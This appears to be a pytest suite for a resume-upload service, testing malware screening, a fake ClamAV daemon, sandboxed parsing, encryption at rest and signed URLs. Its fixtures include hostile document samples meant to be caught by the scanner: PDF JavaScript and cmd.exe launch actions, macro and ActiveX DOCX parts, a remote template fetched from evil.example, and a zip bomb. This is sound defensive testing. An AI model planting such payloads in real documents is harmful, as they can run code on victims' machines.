"""Upload security: malware screening, sandboxed parsing, encryption at rest, signed URLs."""

import io
import os
import socket
import socketserver
import subprocess
import sys
import threading
import time
import zipfile
import zlib
from pathlib import Path

import pytest

from app.core import signing
from app.core.config import settings
from app.models import Resume, User
from app.services import doc_extract, file_scan
from app.services.doc_extract import InvalidResumeFile
from app.services.resume_parser import DOCX_MIME, PDF_MIME
from app.services.storage import ENCRYPTED_HEADER, get_storage
from tests.factories import auth_headers, fetch_resume_file, post_resume

FIXTURES = Path(__file__).parent / "fixtures"
PDF = (FIXTURES / "priya_sharma_backend.pdf").read_bytes()
DOCX = (FIXTURES / "arjun_menon_frontend.docx").read_bytes()


def _docx_with(extra: dict[str, bytes], base: bytes = DOCX) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(base)) as src, zipfile.ZipFile(out, "w") as dst:
        for item in src.infolist():
            dst.writestr(item, src.read(item))
        for name, data in extra.items():
            dst.writestr(name, data, compress_type=zipfile.ZIP_DEFLATED)
    return out.getvalue()


# ---------- heuristic screening ----------


def test_real_resumes_pass_the_scan():
    assert file_scan.heuristic_scan(PDF, "pdf") is None
    assert file_scan.heuristic_scan(DOCX, "docx") is None
    for pdf in (Path(__file__).parents[1] / "seed" / "resumes").glob("*.pdf"):
        assert file_scan.heuristic_scan(pdf.read_bytes(), "pdf") is None, pdf.name


@pytest.mark.parametrize(
    "body",
    [
        b"<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>",
        b"<< /S /J#61vaScript >>",  # name obfuscated with a #xx escape
        b"<< /S /Launch /F (cmd.exe) >>",
        b"<< /Type /EmbeddedFile >>",
    ],
)
def test_pdf_active_content_is_blocked(body):
    data = b"%PDF-1.7\n1 0 obj " + body + b" endobj\n%%EOF"
    assert file_scan.heuristic_scan(data, "pdf").startswith("pdf active content")


def test_pdf_javascript_hidden_in_compressed_stream_is_blocked():
    hidden = zlib.compress(b"<< /S /JavaScript /JS (this.exportDataObject()) >>")
    data = b"%PDF-1.7\n2 0 obj << /Type /ObjStm /Filter /FlateDecode >>\nstream\n"
    data += hidden + b"\nendstream\nendobj\n%%EOF"
    assert "/JavaScript" in file_scan.heuristic_scan(data, "pdf")


def test_docx_threats_are_blocked():
    assert file_scan.heuristic_scan(_docx_with({"word/vbaProject.bin": b"x"}), "docx") == (
        "docx macro"
    )
    assert file_scan.heuristic_scan(_docx_with({"word/activeX/a.xml": b"x"}), "docx") == (
        "docx activex"
    )
    assert file_scan.heuristic_scan(_docx_with({"word/embeddings/o.bin": b"x"}), "docx") == (
        "docx embedded ole object"
    )
    remote = (
        b'<Relationships><Relationship Type=".../attachedTemplate" '
        b'Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>'
    )
    assert file_scan.heuristic_scan(
        _docx_with({"word/_rels/settings.xml.rels": remote}), "docx"
    ) == ("docx remote template")
    bomb = _docx_with({"word/media/big.bin": b"\0" * (60 * 1024 * 1024)})
    assert file_scan.heuristic_scan(bomb, "docx") == "docx zip bomb"


def test_eicar_upload_is_rejected_and_not_stored(client, db):
    _, h = auth_headers(db, client, "s@example.com")
    data = PDF[:-6] + file_scan.EICAR + PDF[-6:]
    res = post_resume(client, h, "cv.pdf", data, PDF_MIME)
    assert res.status_code == 422
    assert res.json()["detail"] == "This file was blocked by the security scan"
    assert db.query(Resume).count() == 0


def test_macro_docx_upload_is_rejected(client, db):
    _, h = auth_headers(db, client, "s@example.com")
    data = _docx_with({"word/vbaProject.bin": b"Attribute VB_Name"})
    res = post_resume(client, h, "cv.docx", data, DOCX_MIME)
    assert res.status_code == 422


# ---------- ClamAV ----------


class FakeClamd(socketserver.BaseRequestHandler):
    """Speaks enough of the clamd protocol: zPING and zINSTREAM."""

    def handle(self):
        cmd = b""
        while not cmd.endswith(b"\0"):
            cmd += self.request.recv(1)
        if cmd == b"zPING\0":
            self.request.sendall(b"PONG\0")
            return
        data = b""
        while True:
            size = int.from_bytes(self._read(4), "big")
            if size == 0:
                break
            data += self._read(size)
        verdict = b"stream: Win.Test.Fake FOUND\0" if b"FAKEVIRUS" in data else b"stream: OK\0"
        self.request.sendall(verdict)

    def _read(self, n):
        buf = b""
        while len(buf) < n:
            buf += self.request.recv(n - len(buf))
        return buf


@pytest.fixture
def clamd(monkeypatch):
    server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), FakeClamd)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    monkeypatch.setattr(settings, "malware_scan", "clamav")
    monkeypatch.setattr(settings, "clamav_host", "127.0.0.1")
    monkeypatch.setattr(settings, "clamav_port", server.server_address[1])
    yield server
    server.shutdown()


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def test_clamav_clean_and_infected(clamd):
    assert file_scan.clamav_ping("127.0.0.1", clamd.server_address[1])
    assert file_scan.scan_upload(PDF, "pdf").summary == "heuristic+clamav:clean"
    with pytest.raises(file_scan.MalwareDetected) as e:
        file_scan.scan_upload(PDF + b"FAKEVIRUS", "pdf")
    assert e.value.reason == "clamav Win.Test.Fake"


def test_upload_with_clamav(client, db, clamd):
    _, h = auth_headers(db, client, "s@example.com")
    ok = post_resume(client, h, "cv.pdf", PDF, PDF_MIME)
    assert ok.status_code == 202
    assert db.get(Resume, ok.json()["id"]).scan_result == "heuristic+clamav:clean"
    bad = post_resume(client, h, "cv.pdf", PDF + b"FAKEVIRUS", PDF_MIME)
    assert bad.status_code == 422


def test_scanner_down_fails_closed(client, db, monkeypatch):
    monkeypatch.setattr(settings, "malware_scan", "clamav")
    monkeypatch.setattr(settings, "clamav_host", "127.0.0.1")
    monkeypatch.setattr(settings, "clamav_port", _free_port())
    _, h = auth_headers(db, client, "s@example.com")
    res = post_resume(client, h, "cv.pdf", PDF, PDF_MIME)
    assert res.status_code == 503
    assert db.query(Resume).count() == 0


# ---------- sandboxed parsing ----------


def test_isolated_extraction_matches_inline():
    isolated = doc_extract.extract_text_isolated(PDF, "pdf", timeout=60, memory_mb=1024)
    assert isolated == doc_extract.extract_text(PDF, "pdf")
    docx_text = doc_extract.extract_text_isolated(DOCX, "docx", timeout=60, memory_mb=1024)
    assert "Arjun" in docx_text


def test_isolated_extraction_reports_bad_files():
    with pytest.raises(InvalidResumeFile, match="Could not read text"):
        doc_extract.extract_text_isolated(b"%PDF-1.4 junk", "pdf", timeout=60, memory_mb=1024)


def test_isolated_extraction_timeout(monkeypatch):
    def hang(*a, **k):
        raise subprocess.TimeoutExpired(cmd="python", timeout=1)

    monkeypatch.setattr(doc_extract.subprocess, "run", hang)
    with pytest.raises(InvalidResumeFile, match="too long"):
        doc_extract.extract_text_isolated(PDF, "pdf", timeout=1, memory_mb=512)


@pytest.mark.skipif(sys.platform == "win32", reason="resource limits are POSIX only")
def test_isolated_extraction_memory_limit():
    with pytest.raises(InvalidResumeFile):
        doc_extract.extract_text_isolated(PDF, "pdf", timeout=60, memory_mb=40)


def test_parser_child_gets_no_secrets(monkeypatch):
    monkeypatch.setenv("JWT_SECRET", "top-secret")
    monkeypatch.setenv("DATABASE_URL", "postgresql://u:p@db/x")
    env = doc_extract._child_env()
    assert "JWT_SECRET" not in env and "DATABASE_URL" not in env
    assert set(env) <= {
        "PATH",
        "SYSTEMROOT",
        "TEMP",
        "TMP",
        "LANG",
        "LC_ALL",
        "PYTHONDONTWRITEBYTECODE",
        "PYTHONIOENCODING",
    }


def test_upload_uses_sandbox_when_enabled(client, db, monkeypatch):
    monkeypatch.setattr(settings, "parser_isolation", "subprocess")
    seen = []
    real = doc_extract.extract_text_isolated

    def spy(*args, **kwargs):
        seen.append(args[1])
        return real(*args, **kwargs)

    monkeypatch.setattr("app.services.resume_parser.extract_text_isolated", spy)
    _, h = auth_headers(db, client, "s@example.com")
    res = post_resume(client, h, "cv.pdf", PDF, PDF_MIME)
    assert res.json()["status"] == "ready"
    assert seen == ["pdf"]


# ---------- encryption at rest ----------


def test_stored_files_are_encrypted(client, db):
    _, h = auth_headers(db, client, "s@example.com")
    rid = post_resume(client, h, "cv.pdf", PDF, PDF_MIME).json()["id"]
    key = db.get(Resume, rid).storage_key
    raw = (Path(os.environ["STORAGE_DIR"]) / key).read_bytes()
    assert raw.startswith(ENCRYPTED_HEADER)
    assert b"%PDF" not in raw and b"Priya" not in raw
    assert get_storage().read(key) == PDF


def test_legacy_plaintext_files_still_readable():
    storage = get_storage()
    storage.inner.save("legacy/old.pdf", PDF, PDF_MIME)
    assert storage.read("legacy/old.pdf") == PDF


# ---------- signed URLs ----------


def test_signed_url_rejects_tampering_expiry_and_revoked_access(client, db):
    user, h = auth_headers(db, client, "s@example.com")
    rid = post_resume(client, h, "cv.pdf", PDF, PDF_MIME).json()["id"]
    link = client.post(f"/api/resumes/{rid}/link", headers=h).json()
    assert link["expires_at"] - time.time() == pytest.approx(settings.signed_url_ttl_seconds, abs=5)
    assert client.get(link["url"]).status_code == 200

    tampered = link["url"].replace(f"uid={user.id}", f"uid={user.id + 1}")
    assert client.get(tampered).status_code == 403
    assert client.get(link["url"][:-4] + "0000").status_code == 403

    old_url, _ = signing.sign_resume_url(rid, user.id, now=time.time() - 3600)
    assert client.get(old_url).status_code == 403

    # Access is re-checked when the link is used.
    db.get(User, user.id).is_active = False
    db.commit()
    assert client.get(link["url"]).status_code == 404


def test_old_bearer_download_route_is_gone(client, db):
    _, h = auth_headers(db, client, "s@example.com")
    rid = post_resume(client, h, "cv.pdf", PDF, PDF_MIME).json()["id"]
    assert client.get(f"/api/resumes/{rid}/file", headers=h).status_code in (404, 405)
    assert fetch_resume_file(client, h, rid).status_code == 200
